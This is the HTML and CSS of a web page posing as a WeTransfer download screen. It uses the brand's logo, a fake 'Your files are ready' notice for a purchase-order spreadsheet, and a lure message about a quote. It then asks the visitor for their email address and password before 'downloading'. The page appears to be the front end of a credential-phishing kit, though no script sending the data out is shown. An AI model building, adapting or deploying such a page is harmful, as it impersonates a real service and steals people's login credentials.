<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Your files are ready</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(to bottom, #e10075 0%, #7b1fa2 100%);
      margin: 0;
      padding: 0;
      overflow: hidden;
    }

    .navbar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 40px;
      color: #fff;
    }

    .logo-section {
      display: flex;
      align-items: center;
    }

    .logo {
      width: 50px;
    }

    .brand-text {
      margin-left: 30px;
      font-size: 20px;
      font-weight: 700;
    }

    .brand-text .ultimate {
      color: #a8c8ff;
    }

    .nav-links button {
      margin-left: 12px;
      padding: 8px 14px;
      font-size: 14px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
    }

    .login {
      background: #000;
      color: #fff;
    }

    .signup {
      background: #fff;
      color: #000;
    }

    .main-content {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 60px;
      height: calc(100vh - 80px);
    }

    .form-card {
      background: #fff;
      padding: 24px;
      border-radius: 18px;
      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
      width: 220px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      height: 400px;
    }

    .form-card h2 {
      margin-bottom: 6px;
      font-size: 18px;
    }

    .expires {
      font-size: 12px;
      color: #666;
      margin-bottom: 14px;
    }

    .filename {
      font-weight: 800;
      font-size: 15px;
      margin-bottom: 12px;
    }

    .message-preview {
      font-size: 12px;
      color: #333;
      margin-bottom: 10px;
    }

    .more {
      font-size: 12px;
      color: #0073e6;
      margin-bottom: 14px;
      cursor: pointer;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    .input-group input {
      border: none;
      border-bottom: 1px solid #ccc;
      padding: 6px 4px;
      font-size: 20px;
      background: transparent;
      outline: none;
    }

    .input-group input:focus {
      border-bottom: 1px solid #0073e6;
    }

    .error-message {
      color: red;
      font-size: 13px;
      min-height: 20px;
      margin-top: 5px;
    }

    .download {
      margin-top: 10px;
      background: #0049b0;
      color: #fff;
      border: none;
      padding: 14px;
      font-weight: 600;
      font-size: 14px;
      border-radius: 10px;
      cursor: pointer;
    }

    .promo-section {
      text-align: center;
      color: white;
      max-width: 600px;
    }

    .promo-section h1 {
      font-size: 48px;
      font-weight: 800;
      margin-bottom: 10px;
    }

    .promo-section h2 {
      font-size: 22px;
      margin-bottom: 30px;
    }

    .shop-btn {
      background: #000;
      color: #fff;
      padding: 12px 28px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 10px;
      border: none;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="navbar">
    <div class="logo-section">
      <img src="https://cdn.freebiesupply.com/logos/large/2x/wetransfer-1-logo-black-and-white.png" class="logo">
      <span class="brand-text">WeTransfer<span class="ultimate">Ultimate</span></span>
    </div>
    <div class="nav-links">
      <button>Features ▾</button>
      <button>Pricing</button>
      <button>Use cases ▾</button>
      <button>Resources ▾</button>
      <button class="login">Log in</button>
      <button class="signup">Sign up</button>
    </div>
  </div>

  <div class="main-content">
    <div class="form-card">
      <div>
        <h2>Your files are ready</h2>
        <div class="expires">Transfer expires in about 11 hours</div>
        <div class="filename">SC PO# 130 -1500-VT23C-050.xls</div>
        <div class="message-preview">Hello sir/ma We would like for you to send us your Quo ...</div>
        <div class="more">more ⌄</div>

        <div class="input-group">
          <input type="email" placeholder="Receiver's Email" id="email" required>
          <input type="password" placeholder="Password" id="password" required>
        </div>
        <div class="error-message" id="errorMsg"></div>
      </div>
      <button class="download">Download</button>
    </div>

    <div class="promo-section">
      <h1>Stand out with every<br>file you send</h1>
      <h2>with your own background and URL</h2>
      <button class="shop-btn">Go Ultimate Now</button>
    </div>
  </div>
